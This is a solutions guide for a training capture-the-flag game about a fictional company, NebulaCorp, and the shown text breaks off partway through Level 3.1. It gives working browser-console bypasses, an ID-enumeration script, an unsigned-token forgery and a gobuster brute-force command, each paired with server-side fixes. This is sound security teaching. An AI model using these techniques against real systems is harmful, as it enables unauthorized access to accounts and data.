# 🚩 NebulaCorp CTF - Complete Solutions Guide

**⚠️ SPOILER WARNING**: This document contains all solutions for the NebulaCorp Security Audit CTF game. Only use this if you're stuck or want to learn the techniques after attempting the challenges.

---

## 📚 Table of Contents

- [Level 1.1: The Forgotten Sticky Note](#level-11-the-forgotten-sticky-note)
- [Level 1.2: Client-Side Validation Bypass](#level-12-client-side-validation-bypass)
- [Level 1.3: JavaScript Security Illusion](#level-13-javascript-security-illusion)
- [Level 1.4: Hidden Endpoints Discovery](#level-14-hidden-endpoints-discovery)
- [Level 2.1: The Ghost Admin (IDOR)](#level-21-the-ghost-admin-idor)
- [Level 2.2: Admin Identity Forge](#level-22-admin-identity-forge)
- [Level 3.1: The Broken Interface](#level-31-the-broken-interface)
- [Level 3.2: The Database Whisper (NoSQL Injection)](#level-32-the-database-whisper-nosql-injection)

---

## Level 1.1: The Forgotten Sticky Note

**Difficulty:** ⭐ Beginner
**Concept:** View Source / HTML Comments
**OWASP:** N/A (Information Disclosure)
**Time:** 5-10 minutes

### 🎯 Objective
Find hidden DNS domains in the page source code and query them to collect flag fragments.

### 👀 What You'll See

When you first load the level:
- A title: "DNS Archive Breach"
- A mission briefing about NebulaCorp's DNS system
- An input field with a "Query" button
- A terminal window below showing: `[Ready] Awaiting domain input...`

### 🔍 Discovery Flow & Solution

#### **Discovery Phase**

**Step 1: Read the Mission Brief**
The page tells you:
- "Check the page source code for developer notes"
- "Query the internal DNS domains you discover"
- "Collect all flag fragments and combine them"

💡 **This is a huge hint!** The challenge is literally telling you to check the page source.

**Step 2: View the Page Source**
Right-click anywhere on the page and select **"View Page Source"** (or press `Ctrl+U` on Windows/Linux, `Cmd+Option+U` on Mac)

**Step 3: Find the Hidden Comment**
Scroll through the source code and look for HTML comments (they look like `<!-- ... -->`)

You'll find this comment near the top:
```html
<!--
  📝 DEVELOPER NOTE:
  The old DNS system still responds to queries for:
  - flag-archive.internal
  - legacy.internal
  - txt.internal

  TODO: Decommission these legacy domains before launch!
-->
```

💡 **Aha!** Developers left internal domain names in the code. This is a common real-world mistake!

#### **Exploitation Phase**

**Step 4: Query Each Domain**

Go back to the page and type the first domain in the input field:
```
flag-archive.internal
```
Click "Query"

The terminal shows:
```
> Querying flag-archive.internal ...
> flag{legacy_systems_
```

💡 **You got the first fragment!** Notice it's incomplete - you need more.

**Step 5: Query the Second Domain**
```
legacy.internal
```
Click "Query"

Result:
```
> Querying legacy.internal ...
> tell_
```

**Step 6: Query the Third Domain**
```
txt.internal
```
Click "Query"

Result:
```
> Querying txt.internal ...
> secrets}
```

**Step 7: Combine the Fragments**

You've collected three fragments:
1. `flag{legacy_systems_`
2. `tell_`
3. `secrets}`

The complete flag is:
```
flag{legacy_systems_tell_secrets}
```

**Step 8: Submit the Flag**

A modal automatically appears asking you to reconstruct the flag. Type:
```
flag{legacy_systems_tell_secrets}
```

Click "Submit" → Level complete! 🎉

### 🏁 Flag
```
flag{legacy_systems_tell_secrets}
```

### 💡 Key Learning

**What Went Wrong:**
- Developers left comments in production code
- Sensitive domain names were exposed
- No access control on internal DNS systems

**Real-World Impact:**
- Attackers routinely check source code for API keys, endpoints, credentials
- Comments can reveal architecture, vulnerabilities, and internal systems
- Source code review is step #1 of any security audit

**How to Prevent:**
- Never include sensitive information in HTML comments
- Strip comments from production builds
- Use environment variables for sensitive data
- Implement proper access controls on internal systems

---

## Level 1.2: Client-Side Validation Bypass

**Difficulty:** ⭐⭐ Beginner-Intermediate
**Concept:** Client-Side Validation Bypass
**OWASP:** A04:2021 – Insecure Design
**Time:** 5-10 minutes

### 🎯 Objective
Bypass the client-side `maxlength` restriction to submit a longer domain name.

### 👀 What You'll See

- Title: "Level 1.2 — The 15-Character Ruler"
- Mission brief mentions a "security patch" with `maxlength=15`
- An input field with a visual "max 15" indicator
- A "Query" button
- A terminal showing: `[Ready] Client patch active — maxlength enforced.`

### 🔍 Discovery Flow & Solution

#### **Discovery Phase**

**Step 1: Try to Type a Long Domain**

The mission brief mentions "internal test domains that exceed normal naming conventions." Let's try typing a long domain name:

```
secure-testing-environment-27.internal
```

💡 **Problem:** The input stops accepting characters after 15! You can see the character count stuck at 15.

**Step 2: Inspect the Input Field**

Right-click on the input field → **"Inspect"** (or press F12 → Elements tab)

You'll see in the HTML:
```html
<input ... maxLength={15} ... />
```

💡 **Aha!** The restriction is **only in the browser**. The server might accept longer inputs!

**Step 3: View Page Source for Hints**

Press `Ctrl+U` to view source. Look for HTML comments:
```html
<!--
  Security patch v1.2 applied: client-side input validation
  Max input length: 15 characters enforced at UI layer

  Test domain: secure-testing-environment-27.internal
  Note: Exceeds maxlength constraint - verify server-side validation works
-->
```

💡 **Perfect!** The comment tells us:
- The domain we need: `secure-testing-environment-27.internal` (42 characters!)
- It's only enforced at "UI layer" (client-side)
- They want to "verify server-side validation works" (spoiler: it doesn't!)

#### **Exploitation Phase - Method 1: Browser Console**

**Step 4: Open Browser DevTools**
Press **F12** → Go to **"Console"** tab

**Step 5: Remove the maxLength Restriction**

Type this JavaScript command:
```javascript
document.querySelector('input').maxLength = 999;
```
Press Enter

💡 **What this does:** Finds the input field and changes its `maxLength` from 15 to 999

**Step 6: Type the Long Domain**

Now go back to the input field and type:
```
secure-testing-environment-27.internal
```

✅ **It works!** You can now type beyond 15 characters.

**Step 7: Click Query**

The terminal reveals:
```
> Querying secure-testing-environment-27.internal ...
> flag{trust_the_server_not_the_client}
```

🎉 **Flag captured!** The level auto-advances.

#### **Exploitation Phase - Method 2: Edit HTML Directly**

**Alternative Step 4-5:**

1. Right-click the input → **"Inspect Element"**
2. In the Elements panel, find: `maxlength="15"`
3. Double-click the `"15"` value
4. Change it to `"999"`
5. Press Enter

Now you can type the long domain!

### 🏁 Flag
```
flag{trust_the_server_not_the_client}
```

### 💡 Key Learning

**What Went Wrong:**
- Security check was ONLY client-side
- Server trusted the input without validation
- Developers assumed the HTML attribute would enforce limits

**Real-World Examples:**
- **Price Manipulation**: Changing hidden form fields to lower prices
- **File Upload Bypass**: Bypassing client-side file type restrictions
- **Rate Limiting**: Bypassing client-side CAPTCHA checks

**How to Prevent:**
```javascript
// ❌ BAD: Client-side only
<input maxLength={15} />

// ✅ GOOD: Server-side validation
app.post('/api/levels/1.2', (req, res) => {
  const { domain } = req.body;

  // Validate on the server!
  if (typeof domain !== 'string' || domain.length > 15) {
    return res.status(400).json({ error: 'Invalid domain length' });
  }

  // ... process request
});
```

**Golden Rule:**
> **NEVER trust client-side validation!** Always validate on the server. The client is under the user's control.

---

## Level 1.3: JavaScript Security Illusion

**Difficulty:** ⭐⭐ Intermediate
**Concept:** JavaScript Bypass / Function Manipulation
**OWASP:** A04:2021 – Insecure Design
**Time:** 5-10 minutes

### 🎯 Objective
Bypass the JavaScript security guard function that blocks certain domains.

### 👀 What You'll See

- Title: "Level 1.3 — The JavaScript Guard"
- Mission brief mentions an "unbreakable defense" using JavaScript
- An input field and "Lookup" button
- Terminal showing: `[SYSTEM] JavaScript Guard v1.0 Activated.`
- Hint about trying `dns-rebinding-test.internal`

### 🔍 Discovery Flow & Solution

#### **Discovery Phase**

**Step 1: Try the Suggested Domain**

The mission brief says: *"Try querying dns-rebinding-test.internal and watch it get intercepted."*

Type in the input:
```
dns-rebinding-test.internal
```
Click "Lookup"

💥 **Alert pops up!**
```
Blocked by JavaScript security policy.
```

💡 **The JavaScript function is blocking us before the request even reaches the server!**

**Step 2: Understand What's Happening**

View the page source (`Ctrl+U`) and search for "jsGuard" or look at the JavaScript:

```javascript
function jsGuard(domain) {
  if (domain === "dns-rebinding-test.internal") {
    alert("Blocked by JavaScript security policy.");
    return true; // Blocked!
  }
  return false; // Allowed
}
```

And you'll see it's called before submission:
```javascript
// Use window.jsGuard to allow console override
if ((window as any).jsGuard(domain)) return;
```

💡 **Key insight:** The function is attached to `window.jsGuard`, which means **we can override it!**

**Step 3: Think Like an Attacker**

The mission brief says:
> "JavaScript runs in the browser... which means it runs on **your machine**. Can you find a way to take control?"

💡 **If it runs on our machine, we control it!**

#### **Exploitation Phase**

**Step 4: Open Browser Console**
Press **F12** → **Console** tab

**Step 5: Override the jsGuard Function**

Type this command:
```javascript
window.jsGuard = function() { return false; }
```
Press Enter

💡 **What this does:**
- Replaces the security function with our own version
- Our version always returns `false` (meaning "allow all domains")
- The original blocking logic is completely bypassed!

**Alternative Override:**
```javascript
jsGuard = () => false;
```
(Same effect, shorter syntax)

**Step 6: Try the Blocked Domain Again**

Go back to the input and type:
```
dns-rebinding-test.internal
```
Click "Lookup"

✅ **No alert!** The request goes through.

Terminal shows:
```
> Querying dns-rebinding-test.internal ...
> flag{javascript_security_is_an_illusion}
```

🎉 **Flag captured!**

### 🏁 Flag
```
flag{javascript_security_is_an_illusion}
```

### 💡 Key Learning

**What Went Wrong:**
- Critical security logic ran in the browser (client-side)
- Developers assumed users couldn't modify JavaScript
- No server-side validation to back up the client check

**Real-World Examples:**
- **Admin Panel Hiding**: `if (!isAdmin) { hideAdminButton(); }` ← Easily bypassed
- **Payment Validation**: Client-side price checks ← Can be modified
- **License Checks**: JavaScript-based license validation ← Can be disabled

**The Illusion:**
Many developers think:
> "If the user can't see the button, they can't access the feature!"

Reality:
> Users can modify ANY JavaScript in their browser. They can call hidden functions, change variables, disable security checks.

**How to Prevent:**
```javascript
// ❌ BAD: Client-side security
function jsGuard(domain) {
  if (domain === "sensitive.internal") {
    return false; // Block it!
  }
}

// ✅ GOOD: Server-side validation
app.post('/api/query', (req, res) => {
  const { domain } = req.body;

  // Validate on the SERVER!
  const blockedDomains = ['sensitive.internal', 'admin.internal'];
  if (blockedDomains.includes(domain)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // Process...
});
```

**Golden Rule:**
> **JavaScript is for UX, not security.** Use it to enhance user experience, not to enforce access control.

---

## Level 1.4: Hidden Endpoints Discovery

**Difficulty:** ⭐⭐ Intermediate
**Concept:** API Endpoint Discovery / Security by Obscurity
**OWASP:** A01:2021 – Broken Access Control
**Time:** 10-15 minutes

### 🎯 Objective
Discover a hidden API endpoint that was supposed to be decommissioned but still responds to requests.

### 👀 What You'll See

- Title: "Level 1.4 — The Hidden Gateway"
- Mission brief about NebulaCorp's "security through obscurity"
- A terminal-style interface showing:
  ```
  [SYSTEM] Endpoint Discovery Tool v2.0 initialized.
  [INFO] Scanning NebulaCorp API architecture...
  [SCAN] Found: /api/levels/1.1 - Active
  [SCAN] Found: /api/levels/1.2 - Active
  [SCAN] Found: /api/levels/1.3 - Active
  [WARNING] Scan incomplete. Some endpoints may be hidden from public routes.
  ```
- An input field to "Submit Flag"

### 🔍 Discovery Flow & Solution

#### **Discovery Phase**

**Step 1: Analyze the Clues**

The terminal output is a huge hint:
- Three endpoints were found: `1.1`, `1.2`, `1.3`
- The scan says it's "incomplete"
- It warns: "Some endpoints may be hidden from public routes"
- The mission brief mentions a "fourth endpoint — a legacy admin panel"

💡 **Pattern Recognition:** If there are endpoints `1.1`, `1.2`, `1.3`... there's probably a `1.4`!

**Step 2: View Page Source**

Press `Ctrl+U` to view source. Look for HTML comments:

```html
<!--
  🔒 INTERNAL SECURITY AUDIT LOG 🔒

  System endpoints discovered during investigation:
  - /api/levels/1.1 (DNS Query System)
  - /api/levels/1.2 (Validation System)
  - /api/levels/1.3 (JavaScript Guard)
  - /api/levels/1.4 (Legacy Admin Panel - DECOMMISSIONED)

  TODO: Remove reference to legacy admin endpoint before production!
  Note: Endpoint still responds to requests despite being marked as deprecated.
-->
```

💡 **JACKPOT!**
- The endpoint is `/api/levels/1.4`
- It's marked as "DECOMMISSIONED" but **"still responds to requests"**
- Classic security-by-obscurity fail!

#### **Exploitation Phase - Method 1: Browser Console**

**Step 3: Open Browser DevTools**
Press **F12** → **Console** tab

**Step 4: Query the Hidden Endpoint**

Type this JavaScript command:
```javascript
fetch('/api/levels/1.4', {
  method: 'GET',
  headers: { 'Content-Type': 'application/json' }
})
.then(r => r.json())
.then(data => console.log(data));
```

Press Enter.

**Response in Console:**
```json
{
  "message": "Legacy admin panel accessed",
  "flag": "flag{hidden_endpoints_reveal_truth}",
  "status": "deprecated_but_active"
}
```

💡 **The endpoint exists and returns the flag!**

**Step 5: Submit the Flag**

Copy the flag:
```
flag{hidden_endpoints_reveal_truth}
```

Paste it into the "Submit Flag" input field and click "Submit Flag"

✅ **Success!** Level 1 complete! 🎉

#### **Exploitation Phase - Method 2: Network Tab**

**Alternative Step 3-4:**

1. Press **F12** → **Network** tab
2. In the Console, run:
   ```javascript
   fetch('/api/levels/1.4').then(r => r.json()).then(console.log)
   ```
3. Watch the Network tab show the request to `/api/levels/1.4`
4. Click on the request to see the response with the flag

#### **Exploitation Phase - Method 3: Direct Navigation**

**Alternative:**

Some endpoints might be accessible via GET. Try navigating directly:
```
http://localhost:3000/api/levels/1.4
```

(This might work depending on the API design!)

### 🏁 Flag
```
flag{hidden_endpoints_reveal_truth}
```

### 💡 Key Learning

**What Went Wrong:**
- "Decommissioned" endpoint was never actually removed
- No authentication required to access internal API
- Relied on obscurity instead of proper access control
- Left documentation in HTML comments

**Real-World Examples:**
- **/admin** routes left accessible
- **/api/debug** endpoints in production
- **/backup** directories with sensitive files
- Old API versions (v1, v2) still active

**How Attackers Find Hidden Endpoints:**

1. **Directory Brute-Forcing:**
   ```bash
   # Tools like Gobuster, Dirbuster, ffuf
   gobuster dir -u https://target.com -w wordlist.txt
   ```

2. **Pattern Recognition:**
   ```
   /api/v1/users
   /api/v1/products
   /api/v1/??? ← Try common words: admin, debug, config, etc.
   ```

3. **JavaScript Analysis:**
   - Read minified JavaScript
   - Find API endpoint references
   - Discover unused or hidden routes

4. **Documentation Leaks:**
   - Swagger/OpenAPI docs left public
   - HTML comments
   - Error messages revealing paths

**How to Prevent:**

```javascript
// ❌ BAD: Relying on obscurity
app.get('/api/secret-admin-panel-do-not-use', (req, res) => {
  // No auth check!
  res.json({ adminData: '...' });
});

// ✅ GOOD: Proper authentication & authorization
app.get('/api/admin/panel',
  requireAuth,           // Check if user is logged in
  requireRole('admin'),  // Check if user has admin role
  (req, res) => {
    res.json({ adminData: '...' });
  }
);

// ✅ BETTER: Actually remove deprecated endpoints!
// Delete the route entirely instead of just hiding it
```

**Best Practices:**
1. **Delete unused endpoints** - Don't just hide them
2. **Implement authentication** on ALL API routes (except truly public ones)
3. **Use authorization** - Check user permissions
4. **Regular security audits** - Find and remove orphaned routes
5. **API gateway** - Centralize access control

**Golden Rule:**
> **"Security through obscurity is not security."** Hiding something doesn't protect it. Proper authentication and authorization do.

---

## Level 2.1: The Ghost Admin (IDOR)

**Difficulty:** ⭐⭐⭐ Advanced
**Concept:** IDOR (Insecure Direct Object Reference)
**OWASP:** A01:2021 – Broken Access Control
**Time:** 10-20 minutes

### 🎯 Objective
Exploit an IDOR vulnerability to access unauthorized user profiles by enumerating ID numbers.

### 👀 What You'll See

- Title: "Level 2.1 — The Ghost Admin"
- Mission brief mentions you have access to Profile ID `1001` (a basic user)
- An input field for "Profile ID"
- "SEARCH" button and "My Profile" button
- Terminal showing: No results initially
- Warning: "Not every profile with 'admin' in the title is what you're looking for. This system is filled with decoys..."

### 🔍 Discovery Flow & Solution

#### **Discovery Phase**

**Step 1: Check Your Own Profile**

Click the **"My Profile"** button (or type `1001` and click SEARCH)

Terminal shows:
```json
{
  "id": 1001,
  "name": "Agent Phoenix",
  "role": "field_agent",
  "email": "phoenix@nebulacorp.internal",
  "clearance": 2
}
```

💡 **Observations:**
- You're user ID `1001`
- You're just a "field_agent" with low clearance
- Your profile is accessible via numeric ID

**Step 2: Understand the Vulnerability**

The mission says to find the "administrator account" by searching the system. Let's think:
- If your ID is `1001`, what about other IDs?
- Can we access profiles we shouldn't have access to?
- The system shows us ANY profile we request!

💡 **This is IDOR:** The system doesn't check if we're AUTHORIZED to view a profile, only if the ID exists.

**Step 3: Look for Clues**

The warning says:
> "Not every profile with 'admin' in the title is what you're looking for. This system is filled with decoys..."

💡 **Strategy:**
- Try different ID numbers
- Look for a "superadmin" or "ghost" account
- Common patterns: round numbers (1000, 5000), special numbers (7777, 9999, 0000)

#### **Exploitation Phase - Trial & Error**

**Step 4: Test Adjacent IDs**

Try `1000`:
```json
{
  "id": 1000,
  "name": "Sarah Johnson",
  "role": "analyst",
  "clearance": 2
}
```

❌ Still a low-level user.

Try `1002`:
```json
{
  "id": 1002,
  "name": "Marcus Wei",
  "role": "field_agent",
  "clearance": 2
}
```

❌ Another field agent.

**Step 5: Try Systematic Enumeration**

Try some common "important" numbers:
- `1` - CEO?
- `100` - Admin?
- `999` - Special account?
- `5000` - Different department?

Most return regular users or "Profile not found"

**Step 6: Try Special/Round Numbers**

Try `7777`:

💥 **JACKPOT!**

Terminal shows:
```json
{
  "id": 7777,
  "name": "Root",
  "role": "superadmin",
  "clearance": 5,
  "department": "CORE_SYSTEM",
  "ghost_token": "GHOST-ACCESS-GRANTED",
  "note": "Emergency access account - hidden from directory"
}
```

💡 **This is the Ghost Administrator!**
- Highest clearance level (5)
- Role: "superadmin"
- Has the `ghost_token` field!
- Hidden from the public directory

**Step 7: Flag Auto-Submitted**

The system automatically detects the `ghost_token` and submits the flag for you!

A "Continue" button appears → Click it to advance to Level 2.2

#### **How I Found 7777**

**Method 1: Lucky Guess**
- `7777` is a common "special" number
- Developers often use repeating digits for test accounts

**Method 2: Systematic Search**
Try ranges:
- `1-100`: Regular users
- `1000-1999`: Regular employees
- `5000-5100`: Different department?
- `7000-8000`: Special accounts? ✅ Found at 7777!
- `9000-9999`: System accounts?

**Method 3: Scripting (Advanced)**

```javascript
// Automate the search
for (let id = 5000; id <= 9999; id++) {
  fetch('/api/levels/2.1', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id })
  })
  .then(r => r.json())
  .then(data => {
    if (data.ghost_token) {
      console.log('FOUND!', id, data);
    }
  });
}
```

⚠️ **Note:** This is brute-force and would trigger rate limiting in a real system!

### 🏁 Flag
```
GHOST-ACCESS-GRANTED
```

### 💡 Key Learning

**What Is IDOR?**

**Insecure Direct Object Reference** occurs when:
1. Application uses user-supplied input (like an ID) to access objects
2. Application **doesn't verify** that the user is authorized to access that object
3. Attacker can manipulate the input to access unauthorized data

**Real-World Examples:**

**Example 1: Bank Account Access**
```
❌ BAD:
GET /api/account?id=12345
→ Returns account details without checking if YOU own account 12345!

✅ GOOD:
GET /api/account?id=12345
→ Check: Does the logged-in user own account 12345?
→ If no: Return 403 Forbidden
```

**Example 2: Document Download**
```
❌ BAD:
GET /download?file=invoice-1001.pdf
→ Anyone can change 1001 to 1002, 1003... and download other users' invoices!

✅ GOOD:
GET /download?file=invoice-1001.pdf
→ Check: Does this user have permission to download this invoice?
```

**How to Prevent IDOR:**

```javascript
// ❌ VULNERABLE CODE
app.post('/api/profile', async (req, res) => {
  const { id } = req.body;

  // No authorization check!
  const profile = await User.findById(id);
  res.json(profile);
});

// ✅ SECURE CODE
app.post('/api/profile', requireAuth, async (req, res) => {
  const { id } = req.body;
  const currentUserId = req.user.id; // From JWT/session

  // Authorization check!
  if (id !== currentUserId && !req.user.isAdmin) {
    return res.status(403).json({
      error: 'You can only access your own profile'
    });
  }

  const profile = await User.findById(id);
  res.json(profile);
});

// ✅ EVEN BETTER: Don't use user-supplied IDs
app.get('/api/my-profile', requireAuth, async (req, res) => {
  // Use the authenticated user's ID from the session/token
  const userId = req.user.id;
  const profile = await User.findById(userId);
  res.json(profile);
});
```

**IDOR Checklist:**
- [ ] Always verify user has permission to access the requested resource
- [ ] Use session/token data, not user-supplied IDs when possible
- [ ] Implement role-based access control (RBAC)
- [ ] Log access attempts for security monitoring
- [ ] Use UUIDs instead of sequential IDs (makes enumeration harder)
- [ ] Implement rate limiting on sensitive endpoints

**Famous IDOR Breaches:**
- **Instagram (2019)**: IDOR allowed viewing private accounts
- **Uber (2016)**: Could access other drivers' information
- **Facebook (2013)**: Accessed other users' notes via ID manipulation

**Golden Rule:**
> **Never trust that a user is authorized just because they know an ID.** Always verify permissions server-side.

---

## Level 2.2: Admin Identity Forge

**Difficulty:** ⭐⭐⭐⭐ Advanced
**Concept:** JWT/Token Manipulation (Unsigned Tokens)
**OWASP:** A07:2021 – Identification and Authentication Failures
**Time:** 15-20 minutes

### 🎯 Objective
Forge an identity token to impersonate an admin by manipulating an unsigned base64-encoded token.

### 👀 What You'll See

- Title: "Level 2.2 — The Forged Identity"
- Mission brief explains that tokens are generated **on the client-side** (in the browser!)
- A large textarea showing your current token:
  ```
  eyJ1c2VyX2lkIjogMTAwMSwgInJvbGUiOiAiYmFzaWMifQ==
  ```
- "SEND TOKEN" button
- Terminal showing "System Response"
- The brief says: "Your current token identifies you as user_id: 1001 with role: 'basic'"

### 🔍 Discovery Flow & Solution

#### **Discovery Phase**

**Step 1: Understand the Scenario**

The mission brief reveals critical information:
> "NebulaCorp's authentication system generates identity tokens **on the client-side**. That means the browser creates the token, not the server."

💡 **HUGE RED FLAG!** If the browser creates the token:
- We control the browser
- We can see how the token is made
- We can modify it!

The brief asks:
> "But if tokens are generated in your browser... **who controls them?**"

💡 **Answer: WE DO!**

**Step 2: Analyze the Token**

Look at the token in the textarea:
```
eyJ1c2VyX2lkIjogMTAwMSwgInJvbGUiOiAiYmFzaWMifQ==
```

💡 **This looks like Base64 encoding!**
- Base64 strings often end with `=` or `==`
- It's a common encoding for JWTs (JSON Web Tokens)
- Base64 is **encoding, not encryption** - it's easily reversible!

**Step 3: Decode the Token**

Open Browser Console (F12 → Console)

Type:
```javascript
atob("eyJ1c2VyX2lkIjogMTAwMSwgInJvbGUiOiAiYmFzaWMifQ==")
```

Result:
```json
{"user_id": 1001, "role": "basic"}
```

💡 **BINGO!** The token is just a JSON object encoded in Base64!
- `user_id`: 1001 (your current ID)
- `role`: "basic" (low-privilege user)

**Step 4: Understand the Goal**

The mission says:
> "Forge a new identity token that grants you administrator privileges."

💡 **Plan:**
1. Decode the token (we just did this!)
2. Change `"role": "basic"` to `"role": "admin"`
3. Encode it back to Base64
4. Submit the forged token

#### **Exploitation Phase - Method 1: Modify Role**

**Step 5: Create Admin Token (Simple Version)**

In Browser Console:
```javascript
// Create a token with admin role
btoa(JSON.stringify({ user_id: 1001, role: "admin" }))
```

Result:
```
eyJ1c2VyX2lkIjoxMDAxLCJyb2xlIjoiYWRtaW4ifQ==
```

💡 **This is our forged admin token!**

**Step 6: Submit the Forged Token**

Copy the forged token:
```
eyJ1c2VyX2lkIjoxMDAxLCJyb2xlIjoiYWRtaW4ifQ==
```

Paste it into the **token textarea** (replacing the old token)

Click **"SEND TOKEN"**

✅ **Success!**

Terminal shows:
```json
{
  "status": "ACCESS GRANTED",
  "admin": true,
  "message": "Admin identity accepted.",
  "admin_key": "ADMIN-IDENTITY-FORGED"
}
```

💥 **Flag captured!** The system accepted our forged token!

The "Continue" button appears → Click to advance to Chapter 3

#### **Exploitation Phase - Method 2: Change User ID Too**

**Alternative Step 5:**

For fun, let's forge a completely different identity:
```javascript
// Become user 7777 (the Ghost Admin from Level 2.1!) with admin role
btoa('{"user_id": 7777, "role": "admin"}')
```

Result:
```
eyJ1c2VyX2lkIjogNzc3NywgInJvbGUiOiAiYWRtaW4ifQ==
```

Submit this token → Also works! ✅

💡 **We can forge ANY identity!**

#### **Why This Works**

**The Vulnerable Code (Server):**
```javascript
// Server receives token from client
const { token } = req.body;

// Decode it
const decoded = JSON.parse(atob(token));

// Check the role (NO SIGNATURE VERIFICATION!)
if (decoded.role === "admin") {
  return res.json({ admin: true, admin_key: "..." });
}
```

💡 **Problems:**
1. Token is just Base64 encoding - not encrypted or signed
2. Server trusts whatever the client sends
3. No verification that the token is legitimate
4. Anyone can create their own token

### 🏁 Flag
```
ADMIN-IDENTITY-FORGED
```

### 💡 Key Learning

**What Is a JWT (JSON Web Token)?**

A JWT has **three parts**:
```
HEADER.PAYLOAD.SIGNATURE
```

Example:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header
.eyJ1c2VyX2lkIjoxMDAxLCJyb2xlIjoiYmFzaWMifQ  ← Payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c    ← Signature
```

- **Header**: Algorithm and token type
- **Payload**: The actual data (user info)
- **Signature**: Cryptographic signature to verify authenticity

**What Went Wrong in Level 2.2?**

The token had **NO SIGNATURE**! It was just:
```
PAYLOAD (no header, no signature)
```

This means:
- ❌ No way to verify token was created by the server
- ❌ Anyone can create their own token
- ❌ Anyone can modify an existing token

**Real JWT vs. Vulnerable Token:**

```javascript
// ❌ VULNERABLE: NebulaCorp's token (Level 2.2)
const token = btoa(JSON.stringify({ user_id: 1001, role: "basic" }));
// → Easy to forge! Just decode, modify, re-encode

// ✅ SECURE: Real JWT with signature
const jwt = require('jsonwebtoken');
const SECRET_KEY = 'super-secret-key-stored-on-server';

// Server creates token
const token = jwt.sign(
  { user_id: 1001, role: "basic" },  // Payload
  SECRET_KEY,                         // Secret key
  { expiresIn: '1h' }                // Expiration
);

// Server verifies token
try {
  const decoded = jwt.verify(token, SECRET_KEY);
  // Token is valid! Use decoded data
} catch (err) {
  // Token was tampered with or expired!
  return res.status(401).json({ error: 'Invalid token' });
}
```

**How to Prevent Token Forgery:**

1. **Use Proper JWTs with Signatures**
   ```javascript
   // Use libraries like jsonwebtoken (Node.js)
   const jwt = require('jsonwebtoken');
   ```

2. **Keep Secret Keys Secret**
   - Store in environment variables
   - Never commit to Git
   - Rotate regularly

3. **Verify Tokens Server-Side**
   ```javascript
   // Always verify before trusting the payload
   const decoded = jwt.verify(token, SECRET_KEY);
   ```

4. **Use Strong Algorithms**
   - HS256 (HMAC-SHA256) minimum
   - RS256 (RSA) for better security

5. **Add Expiration Times**
   ```javascript
   jwt.sign(payload, SECRET_KEY, { expiresIn: '1h' });
   ```

6. **Never Trust Client-Generated Tokens**
   - Tokens must be created by the server
   - Client should only store and send them

**Real-World Examples:**

**Vulnerable:**
```javascript
// ❌ Client-side token generation
localStorage.setItem('token', btoa(JSON.stringify({ isAdmin: true })));
```

**Secure:**
```javascript
// ✅ Server generates token after login
app.post('/login', async (req, res) => {
  const user = await validateCredentials(req.body);

  // Server creates signed token
  const token = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '24h' }
  );

  res.json({ token });
});

// ✅ Server verifies token on protected routes
app.get('/admin/dashboard', requireAuth, (req, res) => {
  // requireAuth middleware already verified token
  // req.user contains decoded token data

  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.json({ adminData: '...' });
});
```

**Golden Rules:**
1. **Never generate security tokens client-side**
2. **Always use cryptographic signatures**
3. **Always verify signatures before trusting token data**
4. **Tokens are for authentication, not authorization** - Always check permissions server-side

---

## Level 3.1: The Broken Interface

**Difficulty:** ⭐⭐⭐⭐ Advanced
**Concept:** Multi-Phase Interactive Puzzle
**OWASP:** N/A (Unique Challenge - Pattern Recognition)
**Time:** 15-30 minutes

### 🎯 Objective
Complete 3 sequential phases by interacting with a glitchy, broken-looking UI. Each phase tests pattern recognition, observation, and creative problem-solving.

### 👀 What You'll See

- A glitchy, corrupted-looking interface
- Red scanlines and visual artifacts
- Title: "THE BROKEN INTERFACE" (in red, glitching)
- System status: "FAILED"
- Strange error messages and UI elements
- Everything looks intentionally broken

### 🔍 Discovery Flow & Solution

#### **Phase 1: Multi-Click Discovery**

**What You See:**
```
ERROR 404: Access    Denied
```

💡 **Notice the unusual spacing between "Access" and "Denied"**

**Step 1: Read the Environment**

The screen is glitching, showing red error messages. The word "Access" seems to be emphasized with extra spacing.

**Step 2: Experiment with Clicking**

Try clicking on "Access" once → Nothing happens

Try clicking multiple times quickly...

**Step 3: The Solution**

Click "Access" **5 times within 3 seconds**

Counter appears: `(1/5)`, `(2/5)`, `(3/5)`, `(4/5)`, `(5/5)`

✅ **Success!**
```
PATTERN DETECTED: MULTI-PRESS BEHAVIOR ACKNOWLEDGED
KEY 1 UNLOCKED
```

Fragment collected: `INTERFACE_`

**💡 Hint Available:**
If you wait 45 seconds without solving, the word "Access" will flicker 5 times to hint at the solution!

#### **Phase 2: Arrow Key Sequence**

**What You See:**
```
ERR_UP      ERR_UP
ERR_DOWN    ERR_DOWN
ERR_LEFT    ERR_RIGHT    ERR_LEFT    ERR_RIGHT
```

💡 **The spacing looks intentional but misaligned**

**Step 1: Observe the Pattern**

The error codes are:
- Two `ERR_UP`
- Two `ERR_DOWN`
- Four alternating: `ERR_LEFT`, `ERR_RIGHT`, `ERR_LEFT`, `ERR_RIGHT`

**Step 2: Wait for the Hint**

After 60 seconds, the spacing aligns for 1 second:
```
↑    ↑
↓    ↓
←  →  ←  →
```

💡 **It's a sequence!** And it looks like the famous Konami Code!

**Step 3: Input the Sequence**

Using your keyboard arrow keys, type:
```
↑ ↑ ↓ ↓ ← → ← →
(Up Up Down Down Left Right Left Right)
```

You'll see your sequence appear below:
```
Sequence: ↑ ↑ ↓ ↓ ← → ← →
```

✅ **Success!**
```
KEY 2 VERIFIED
```

Fragment collected: `NOT_BROKEN_`

#### **Phase 3: Red Error Selection**

**What You See:**

Seven colored error lines:
```
ERR-11 — MEMORY_LEAK_DETECTED (red)
ERR-28 — CACHE_OVERFLOW_WARNING (yellow)
ERR-07 — NETWORK_TIMEOUT_ERROR (blue)
ERR-44 — STACK_CORRUPTION_CRITICAL (red)
ERR-13 — PROCESS_SPAWN_SUCCESS (green)
ERR-31 — SEGFAULT_VIOLATION_FATAL (red)
ERR-92 — THREAD_DEADLOCK_DETECTED (purple)
```

Hint: "... only the red ones remain stable ..."

**Step 1: Identify the Red Errors**

Red errors:
- ERR-11 (top)
- ERR-44 (middle)
- ERR-31 (bottom)

